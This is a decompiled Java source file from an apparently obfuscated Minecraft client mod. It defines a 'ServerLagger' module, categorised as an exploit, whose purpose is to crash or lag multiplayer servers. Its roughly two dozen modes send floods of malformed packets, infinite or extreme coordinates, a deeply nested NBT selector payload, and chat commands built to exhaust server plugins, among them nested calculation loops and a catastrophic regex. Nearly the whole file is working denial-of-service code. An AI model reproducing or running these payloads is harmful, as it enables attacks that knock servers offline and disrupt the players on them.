/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap
 *  it.unimi.dsi.fastutil.ints.Int2ObjectMap
 *  it.unimi.dsi.fastutil.ints.Int2ObjectMaps
 *  it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap
 *  net.minecraft.class_1268
 *  net.minecraft.class_1297
 *  net.minecraft.class_1533
 *  net.minecraft.class_1657
 *  net.minecraft.class_1690
 *  net.minecraft.class_1703
 *  net.minecraft.class_1707
 *  net.minecraft.class_1713
 *  net.minecraft.class_1714
 *  net.minecraft.class_1735
 *  net.minecraft.class_1738
 *  net.minecraft.class_1799
 *  net.minecraft.class_1802
 *  net.minecraft.class_1935
 *  net.minecraft.class_2338
 *  net.minecraft.class_2350
 *  net.minecraft.class_2374
 *  net.minecraft.class_239
 *  net.minecraft.class_243
 *  net.minecraft.class_2596
 *  net.minecraft.class_2670
 *  net.minecraft.class_2805
 *  net.minecraft.class_2813
 *  net.minecraft.class_2824
 *  net.minecraft.class_2827
 *  net.minecraft.class_2828$class_2829
 *  net.minecraft.class_2828$class_2830
 *  net.minecraft.class_2833
 *  net.minecraft.class_2836
 *  net.minecraft.class_2840
 *  net.minecraft.class_2846
 *  net.minecraft.class_2846$class_2847
 *  net.minecraft.class_2868
 *  net.minecraft.class_2885
 *  net.minecraft.class_2886
 *  net.minecraft.class_3935
 *  net.minecraft.class_3965
 *  net.minecraft.class_516
 *  net.minecraft.class_8786
 */
package dev.idhammai.c.r.q.Q;

import dev.idhammai.Frog;
import dev.idhammai.P.r.K.r;
import dev.idhammai.P.r.c.QO;
import dev.idhammai.P.r.c.i;
import dev.idhammai.c.r.O.Y.B;
import dev.idhammai.c.r.O.Y.W;
import dev.idhammai.c.r.O.Y.l;
import dev.idhammai.c.r.q.Q.k;
import dev.idhammai.c.r.w;
import dev.idhammai.c.r.y;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.List;
import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import net.minecraft.class_1268;
import net.minecraft.class_1297;
import net.minecraft.class_1533;
import net.minecraft.class_1657;
import net.minecraft.class_1690;
import net.minecraft.class_1703;
import net.minecraft.class_1707;
import net.minecraft.class_1713;
import net.minecraft.class_1714;
import net.minecraft.class_1735;
import net.minecraft.class_1738;
import net.minecraft.class_1799;
import net.minecraft.class_1802;
import net.minecraft.class_1935;
import net.minecraft.class_2338;
import net.minecraft.class_2350;
import net.minecraft.class_2374;
import net.minecraft.class_239;
import net.minecraft.class_243;
import net.minecraft.class_2596;
import net.minecraft.class_2670;
import net.minecraft.class_2805;
import net.minecraft.class_2813;
import net.minecraft.class_2824;
import net.minecraft.class_2827;
import net.minecraft.class_2828;
import net.minecraft.class_2833;
import net.minecraft.class_2836;
import net.minecraft.class_2840;
import net.minecraft.class_2846;
import net.minecraft.class_2868;
import net.minecraft.class_2885;
import net.minecraft.class_2886;
import net.minecraft.class_3935;
import net.minecraft.class_3965;
import net.minecraft.class_516;
import net.minecraft.class_8786;

public class I
extends y {
    private final B<k> V = this.S(new B<k>("Mode", dev.idhammai.c.r.q.Q.k.Selector).I("\u6a21\u5f0f"));
    private final l t = this.p(new l("ArmorPackets", 1000.0, 1.0, 10000.0, 1.0, this::lambda$new$0).D("\u76d4\u7532\u5305\u6570"));
    private final l J = this.p(new l("WindowPackets", 6.0, 2.0, 12.0, 1.0, this::lambda$new$1).D("\u7a97\u53e3\u5305\u6570"));
    private final l u = this.p(new l("OPackets", 1000.0, 1.0, 10000.0, 1.0, this::lambda$new$2).D("\u526f\u624b\u5305\u6570"));
    private final l T = this.p(new l("VPackets", 2000.0, 100.0, 10000.0, 1.0, this::lambda$new$3).D("\u8f7d\u5177\u5305\u6570"));
    private final l k = this.p(new l("AACPackets", 5000.0, 1.0, 10000.0, 1.0, this::lambda$new$4).D("AAC\u5305\u6570"));
    private final l G = this.p(new l("SlotPackets", 15.0, 1.0, 100.0, 1.0, this::lambda$new$5).D("\u70b9\u51fb\u69fd\u4f4d\u5305\u6570"));
    private final l h = this.p(new l("IPackets", 15.0, 1.0, 100.0, 1.0, this::lambda$new$6).D("\u4ea4\u4e92\u5305\u6570"));
    private final l K = this.p(new l("MPackets", 2000.0, 1.0, 10000.0, 1.0, this::lambda$new$7).D("\u79fb\u52a8\u5305\u6570"));
    private final l y = this.p(new l("CraftPackets", 3.0, 1.0, 100.0, 1.0, this::lambda$new$8).D("\u5408\u6210\u5305\u6570"));
    private final l L = this.p(new l("SPackets", 200.0, 50.0, 2000.0, 1.0, this::lambda$new$9).D("\u5e8f\u5217\u5305\u6570"));
    private final l c = this.p(new l("Count", 3.0, 1.0, 5.0, 1.0, this::lambda$new$10).D("\u6b21\u6570"));
    private final l N = this.p(new l("Length", 2032.0, 1000.0, 3000.0, 1.0, this::lambda$new$11).D("\u957f\u5ea6"));
    private final W C = this.S(new W("Empty", true, this::lambda$new$12).k("\u7a7a\u69fd\u4e5f\u4e22\u5f03"));
    private final W w = this.S(new W("AutoDisable", true).k("\u81ea\u52a8\u5173\u95ed"));
    private final W g = this.S(new W("SmartDisable", true).k("\u667a\u80fd\u5173\u95ed"));
    private final l Y = this.p(new l("Delay", 1.0, 0.0, 100.0, 1.0).D("\u5ef6\u8fdf").P("tick"));
    int n = 0;
    private long j;

    public I() {
        super("ServerLagger", dev.idhammai.c.r.w.Exploit);
        this.L("\u5d29\u670d");
    }

    public static double B(double d2) {
        Random random = new Random();
        return random.nextDouble() * d2;
    }

    @r
    public void a(QO qO) {
        if (I.M()) {
            if (this.w.h()) {
                this.p();
            }
            return;
        }
        ++this.n;
        if ((double)this.n <= this.Y.e()) {
            return;
        }
        this.n = 0;
        block4 : switch (this.V.X().ordinal()) {
            case 22: {
                class_1707 class_17072;
                boolean bl = false;
                class_1703 class_17032 = I.W.field_1724.field_7512;
                if (class_17032 instanceof class_1707) {
                    class_1735 class_17352;
                    int n2;
                    class_17072 = (class_1707)class_17032;
                    for (n2 = 0; n2 < class_17072.method_7629().method_5439(); ++n2) {
                        class_17352 = class_17072.method_7611(n2);
                        if (!class_17352.method_7681() || class_17352.method_7677().method_7909() != class_1802.field_8573) continue;
                        I.W.field_1761.method_2906(I.W.field_1724.field_7512.field_7763, class_17352.field_7874, 1, class_1713.field_7795, (class_1657)I.W.field_1724);
                        return;
                    }
                    for (n2 = 0; n2 < class_17072.method_7629().method_5439(); ++n2) {
                        class_17352 = class_17072.method_7611(n2);
                        if ((class_17352.method_7681() || this.C.h()) && n2 < 45) {
                            I.W.field_1761.method_2906(I.W.field_1724.field_7512.field_7763, n2, 1, class_1713.field_7795, (class_1657)I.W.field_1724);
                            bl = true;
                        }
                        if (n2 != 51) continue;
                        I.W.field_1761.method_2906(I.W.field_1724.field_7512.field_7763, n2, 0, class_1713.field_7790, (class_1657)I.W.field_1724);
                    }
                }
                if (bl) break;
                for (class_1297 class_12972 : Frog.THREAD.z()) {
                    if (!(class_12972 instanceof class_1533)) continue;
                    class_17072 = (class_1533)class_12972;
                    if (!(I.W.field_1724.method_33571().method_1022(class_17072.method_19538()) < 3.0)) continue;
                    W.method_1562().method_52787((class_2596)class_2824.method_34208((class_1297)class_17072, (boolean)I.W.field_1724.method_5715(), (class_1268)class_1268.field_5808, (class_243)class_17072.method_19538()));
                    break block4;
                }
                break;
            }
            case 26: {
                class_1703 class_17033 = I.W.field_1724.field_7512;
                Int2ObjectArrayMap int2ObjectArrayMap = new Int2ObjectArrayMap();
                int2ObjectArrayMap.put(0, (Object)new class_1799((class_1935)class_1802.field_8094, 1));
                int n3 = 0;
                while ((double)n3 < this.J.e() + 1.0) {
                    W.method_1562().method_52787((class_2596)new class_2813(class_17033.field_7763, class_17033.method_37421(), 36, -1, class_1713.field_7791, class_17033.method_34255().method_7972(), (Int2ObjectMap)int2ObjectArrayMap));
                    ++n3;
                }
                break;
            }
            case 2: {
                for (int i2 = 0; i2 < this.t.V(); ++i2) {
                    if (I.W.field_1724.method_31548().method_5438(38).method_7909() != class_1802.field_8162) {
                        I.W.field_1761.method_2906(I.W.field_1724.field_7512.field_7763, 6, 0, class_1713.field_7791, (class_1657)I.W.field_1724);
                    }
                    if (!(I.W.field_1724.method_6047().method_7909() instanceof class_1738) && I.W.field_1724.method_6047().method_7909() != class_1802.field_8833) continue;
                    I.W.field_1761.method_2919((class_1657)I.W.field_1724, class_1268.field_5808);
                }
                break;
            }
            case 4: {
                for (int i3 = 0; i3 < 5; ++i3) {
                    class_2827 class_28272 = new class_2827(this.j++);
                    try {
                        W.method_1562().method_52787((class_2596)class_28272);
                        continue;
                    }
                    catch (Exception exception) {
                        exception.printStackTrace();
                    }
                }
                break;
            }
            case 18: {
                for (int i4 = 0; i4 < 100; ++i4) {
                    class_1799 class_17992 = new class_1799((class_1935)I.W.field_1724.method_6047().method_7909());
                    class_2813 class_28132 = new class_2813(0, 69, I.W.field_1724.field_7512.method_37421(), 1, class_1713.field_7794, class_17992, (Int2ObjectMap)new Int2ObjectOpenHashMap());
                    try {
                        W.method_1562().method_52787((class_2596)class_28132);
                        continue;
                    }
                    catch (Exception exception) {
                        exception.printStackTrace();
                    }
                }
                break;
            }
            case 6: {
                if (!(I.W.field_1724.field_7512 instanceof class_1714) || W.method_1562() == null) {
                    return;
                }
                try {
                    List list = I.W.field_1724.method_3130().method_1393();
                    for (class_516 class_5162 : list) {
                        for (class_8786 class_87862 : class_5162.method_2648(true)) {
                            int n4 = 0;
                            while ((double)n4 < this.y.e()) {
                                W.method_1562().method_52787((class_2596)new class_2840(I.W.field_1724.field_7512.field_7763, class_87862, true));
                                ++n4;
                            }
                        }
                    }
                    break;
                }
                catch (Exception exception) {
                    this.y("\u00a74" + exception.getMessage());
                    exception.printStackTrace();
                    if (!this.g.h()) break;
                    this.p();
                    break;
                }
            }
            case 9: {
                class_239 class_2392 = W.method_1560().method_5745(256.0, 0.0f, false);
                if (!(class_2392 instanceof class_3965)) break;
                class_3965 class_39652 = (class_3965)class_2392;
                class_243 class_2432 = class_39652.method_17784();
                class_3965 class_39653 = new class_3965(class_2432, class_2350.field_11033, class_2338.method_49638((class_2374)class_2432), false);
                int n5 = 0;
                while ((double)n5 < this.L.e()) {
                    W.method_1562().method_52787((class_2596)new class_2885(class_1268.field_5808, class_39653, -1));
                    ++n5;
                }
                break;
            }
            case 15: {
                if (W.method_1562() == null) {
                    return;
                }
                try {
                    class_243 class_2433 = I.W.field_1724.method_19538();
                    int n6 = 0;
                    while ((double)n6 < this.K.e()) {
                        class_2828.class_2830 class_28302 = new class_2828.class_2830(class_2433.field_1352 + this.L(1.0), class_2433.field_1351 + this.L(1.0), class_2433.field_1350 + this.L(1.0), (float)I.B(90.0), (float)I.B(180.0), true);
                        W.method_1562().method_52787((class_2596)class_28302);
                        ++n6;
                    }
                    break;
                }
                catch (Exception exception) {
                    this.y("\u00a74" + exception.getMessage());
                    exception.printStackTrace();
                    if (!this.g.h()) break;
                    this.p();
                    break;
                }
            }
            case 21: {
                String string = this.D(this.N.V());
                String string2 = "msg @keyCodec[nbt={PAYLOAD}]".replace("{PAYLOAD}", string);
                int n7 = 0;
                while ((double)n7 < this.c.e()) {
                    W.method_1562().method_52787((class_2596)new class_2805(0, string2));
                    ++n7;
                }
                if (!this.g.h()) break;
                this.p();
                break;
            }
            case 14: {
                if (!(I.W.field_1755 instanceof class_3935)) {
                    return;
                }
                W.method_1562().method_52787((class_2596)new class_2813(I.W.field_1724.field_7512.field_7763, I.W.field_1724.field_7512.method_37421(), 0, 0, class_1713.field_7794, I.W.field_1724.field_7512.method_34255().method_7972(), Int2ObjectMaps.emptyMap()));
                if (!this.g.h()) break;
                this.p();
                break;
            }
            case 11: {
                int n8 = 0;
                while ((double)n8 < this.h.e()) {
                    class_243 class_2434 = this.q();
                    W.method_1562().method_52787((class_2596)new class_2885(class_1268.field_5808, new class_3965(class_2434, class_2350.field_11033, class_2338.method_49638((class_2374)class_2434), false), 0));
                    ++n8;
                }
                break;
            }
            case 12: {
                class_243 class_2435 = new class_243(Double.POSITIVE_INFINITY, 255.0, Double.NEGATIVE_INFINITY);
                W.method_1562().method_52787((class_2596)new class_2885(class_1268.field_5808, new class_3965(class_2435, class_2350.field_11033, class_2338.method_49638((class_2374)class_2435), false), 0));
                break;
            }
            case 10: {
                int n9 = 0;
                while ((double)n9 < this.h.e()) {
                    I.n(I::lambda$onUpdate$13);
                    ++n9;
                }
                break;
            }
            case 13: {
                Int2ObjectArrayMap int2ObjectArrayMap = new Int2ObjectArrayMap();
                int2ObjectArrayMap.put(0, (Object)new class_1799((class_1935)class_1802.field_8264, 1));
                int n10 = 0;
                while ((double)n10 < this.G.e()) {
                    W.method_1562().method_52787((class_2596)new class_2813(I.W.field_1724.field_7512.field_7763, 123344, 2957234, 2859623, class_1713.field_7790, new class_1799((class_1935)class_1802.field_8162, -1), (Int2ObjectMap)int2ObjectArrayMap));
                    ++n10;
                }
                break;
            }
            case 0: {
                for (double d2 = 0.0; d2 < this.k.e(); d2 += 1.0) {
                    W.method_1562().method_52787((class_2596)new class_2828.class_2829(I.W.field_1724.method_23317() + 9412.0 * d2, I.W.field_1724.method_23318() + 9412.0 * d2, I.W.field_1724.method_23321() + 9412.0 * d2, true));
                }
                if (!this.g.h()) break;
                this.p();
                break;
            }
            case 1: {
                for (double d3 = 0.0; d3 < this.k.e(); d3 += 1.0) {
                    W.method_1562().method_52787((class_2596)new class_2828.class_2829(I.W.field_1724.method_23317() + 500000.0 * d3, I.W.field_1724.method_23318() + 500000.0 * d3, I.W.field_1724.method_23321() + 500000.0 * d3, true));
                }
                if (!this.g.h()) break;
                this.p();
                break;
            }
            case 17: {
                for (double d4 = 0.0; d4 < this.k.e(); d4 += 1.0) {
                    W.method_1562().method_52787((class_2596)new class_2828.class_2829(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                }
                if (!this.g.h()) break;
                this.p();
                break;
            }
            case 3: {
                class_1297 class_12973 = I.W.field_1724.method_5854();
                if (class_12973 == null) {
                    if (this.g.h()) {
                        this.p();
                    }
                    return;
                }
                if (!(class_12973 instanceof class_1690) && this.g.h()) {
                    this.p();
                }
                int n11 = 0;
                while ((double)n11 < this.T.e()) {
                    W.method_1562().method_52787((class_2596)new class_2836(true, true));
                    ++n11;
                }
                break;
            }
            case 25: {
                class_1297 class_12974 = I.W.field_1724.method_5854();
                if (class_12974 == null) {
                    if (this.g.h()) {
                        this.p();
                    }
                    return;
                }
                class_2338 class_23382 = I.W.field_1724.method_24515();
                class_243 class_2436 = new class_243((double)class_23382.method_10263() + 0.5, (double)(class_23382.method_10264() + 1), (double)class_23382.method_10260() + 0.5);
                class_12974.method_30634(class_2436.field_1352, class_2436.field_1351 - 1.0, class_2436.field_1350);
                int n12 = 0;
                while ((double)n12 < this.T.e()) {
                    W.method_1562().method_52787((class_2596)new class_2833(class_12974));
                    ++n12;
                }
                break;
            }
            case 24: {
                int n13 = 0;
                while ((double)n13 < this.u.e()) {
                    I.W.field_1724.field_3944.method_52787((class_2596)new class_2868(0));
                    I.W.field_1724.field_3944.method_52787((class_2596)new class_2868(1));
                    ++n13;
                }
                break;
            }
            case 23: {
                int n14 = 0;
                while ((double)n14 < this.u.e()) {
                    I.W.field_1761.method_2906(I.W.field_1724.field_7512.field_7763, 45, I.W.field_1724.method_31548().field_7545, class_1713.field_7791, (class_1657)I.W.field_1724);
                    ++n14;
                }
                break;
            }
            case 19: {
                int n15 = 0;
                while ((double)n15 < this.u.e()) {
                    W.method_1562().method_52787((class_2596)new class_2846(class_2846.class_2847.field_12969, class_2338.field_10980, class_2350.field_11036));
                    ++n15;
                }
                break;
            }
            case 8: {
                W.method_1562().method_45730("to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                if (!this.g.h()) break;
                this.p();
                break;
            }
            case 27: {
                W.method_1562().method_45730("/calc for(i=0;i<256;i++){for(keyCodec=0;keyCodec<256;keyCodec++){for(elementCodec=0;elementCodec<256;elementCodec++){for(c=0;c<255;c++){}}}}");
                if (!this.g.h()) break;
                this.p();
                break;
            }
            case 5: {
                double d5;
                for (d5 = I.W.field_1724.method_23318(); d5 < 255.0; d5 += 5.0) {
                    W.method_1562().method_52787((class_2596)new class_2828.class_2829(I.W.field_1724.method_23317(), d5, I.W.field_1724.method_23321(), true));
                }
                for (d5 = 0.0; d5 < 6685.0; d5 += 5.0) {
                    W.method_1562().method_52787((class_2596)new class_2828.class_2829(I.W.field_1724.method_23317() + d5, 255.0, I.W.field_1724.method_23321() + d5, true));
                }
                break;
            }
            case 16: {
                W.method_1562().method_45730("mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
                if (!this.g.h()) break;
                this.p();
                break;
            }
            case 7: {
                W.method_1562().method_45730("pay * keyCodec keyCodec");
                if (!this.g.h()) break;
                this.p();
                break;
            }
            case 20: {
                W.method_1562().method_45730("promote * keyCodec");
                if (!this.g.h()) break;
                this.p();
            }
        }
    }

    @r
    public void u(i i2) {
        if (I.W.field_1724 == null || I.W.field_1687 == null) {
            return;
        }
        class_2596<?> class_25962 = i2.L();
        if (class_25962 instanceof class_2670) {
            class_2670 class_26702 = (class_2670)class_25962;
            this.j = class_26702.method_11517();
        }
    }

    public double L(double d2) {
        return I.B(d2) - d2 / 2.0;
    }

    private class_243 q() {
        return new class_243((double)new Random().nextInt(0xFFFFFF), 255.0, (double)new Random().nextInt(0xFFFFFF));
    }

    private String D(int n2) {
        String string = IntStream.range(0, n2).mapToObj(I::lambda$generateJsonObject$14).collect(Collectors.joining());
        return "{keyCodec:" + string + "}";
    }

    @Override
    public String I() {
        return this.V.X().name();
    }

    @Override
    public void L() {
        this.n = 999;
    }

    @Override
    public void F() {
        if (this.w.h()) {
            this.p();
        }
    }

    @r
    public void p(dev.idhammai.P.r.c.k k2) {
        if (this.w.h()) {
            this.p();
        }
    }

    private static String lambda$generateJsonObject$14(int n2) {
        return "[";
    }

    private static class_2596 lambda$onUpdate$13(int n2) {
        return new class_2886(class_1268.field_5808, n2, Frog.ROTATION.X(), Frog.ROTATION.F());
    }

    private boolean lambda$new$12() {
        return this.V.x(dev.idhammai.c.r.q.Q.k.Song);
    }

    private boolean lambda$new$11() {
        return this.V.X() == dev.idhammai.c.r.q.Q.k.Selector;
    }

    private boolean lambda$new$10() {
        return this.V.X() == dev.idhammai.c.r.q.Q.k.Selector;
    }

    private boolean lambda$new$9() {
        return this.V.X() == dev.idhammai.c.r.q.Q.k.InteractBlock;
    }

    private boolean lambda$new$8() {
        return this.V.X() == dev.idhammai.c.r.q.Q.k.Crafting;
    }

    private boolean lambda$new$7() {
        return this.V.X() == dev.idhammai.c.r.q.Q.k.MovementSpam;
    }

    private boolean lambda$new$6() {
        return this.V.X() == dev.idhammai.c.r.q.Q.k.InteractNoCom || this.V.X() == dev.idhammai.c.r.q.Q.k.InteractItem;
    }

    private boolean lambda$new$5() {
        return this.V.X() == dev.idhammai.c.r.q.Q.k.InvalidClickSlot;
    }

    private boolean lambda$new$4() {
        return this.V.X() == dev.idhammai.c.r.q.Q.k.AAC || this.V.X() == dev.idhammai.c.r.q.Q.k.AAC2 || this.V.X() == dev.idhammai.c.r.q.Q.k.NullPosition;
    }

    private boolean lambda$new$3() {
        return this.V.X() == dev.idhammai.c.r.q.Q.k.Vehicle || this.V.X() == dev.idhammai.c.r.q.Q.k.Boat;
    }

    private boolean lambda$new$2() {
        return this.V.X() == dev.idhammai.c.r.q.Q.k.Offhand || this.V.X() == dev.idhammai.c.r.q.Q.k.Swap || this.V.X() == dev.idhammai.c.r.q.Q.k.SwitchSlot;
    }

    private boolean lambda$new$1() {
        return this.V.X() == dev.idhammai.c.r.q.Q.k.Window;
    }

    private boolean lambda$new$0() {
        return this.V.X() == dev.idhammai.c.r.q.Q.k.Armor;
    }
}

